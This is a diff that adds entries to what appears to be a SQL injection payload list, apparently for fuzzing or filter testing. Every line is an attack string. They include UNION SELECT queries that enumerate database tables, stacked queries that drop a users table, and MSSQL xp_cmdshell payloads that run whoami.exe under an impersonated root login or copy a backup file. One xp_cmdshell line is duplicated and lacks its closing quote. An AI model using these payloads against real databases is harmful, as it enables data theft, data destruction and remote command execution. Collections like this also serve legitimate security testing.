@@ -448,3 +448,21 @@ sin(1)-1 group by 1 union select 1--
 -(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1
 -(1) for update  UNION select table_name from information_schema.tables limit 1
 1 for update UNION select table_name from information_schema.tables limit 1
+
+-(1) for update UNION select table_name from information_schema.tables limit 1
+-(true) for update UNION select table_name from information_schema.tables limit 1
+-(null) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update having true UNION select table_name from information_schema.tables limit 1
+-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for updateUNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for update UNION select table_name from information_schema.tables limit 1
+-(1) having 1 for update UNION select table_name from information_schema.tables limit 1
+
+\''; DROP TABLE users; --
+\''; /* one */ ;DROP TABLE users; --
+\''; select 1; drop table users; --
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
